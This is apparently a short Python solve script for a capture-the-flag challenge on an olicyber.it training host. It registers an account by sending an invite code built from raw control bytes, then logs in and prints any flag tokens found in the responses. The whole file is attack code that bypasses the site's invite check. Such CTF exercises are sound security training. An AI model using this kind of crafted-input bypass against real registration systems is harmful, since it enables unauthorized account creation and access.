import requests, re
username, password = "ciaolorenzo", "addiolorenzo"
site1 = "http://frittomisto.challs.olicyber.it/register"
site2 = "http://frittomisto.challs.olicyber.it/login"
inviteCode = bytes.fromhex("00010203040506070809").decode()

s = requests.Session()

r = s.post(site1, json={"username":username, "password":password, "invite":inviteCode}).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)

r = s.post(site2, json={"username":username, "password":password}).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)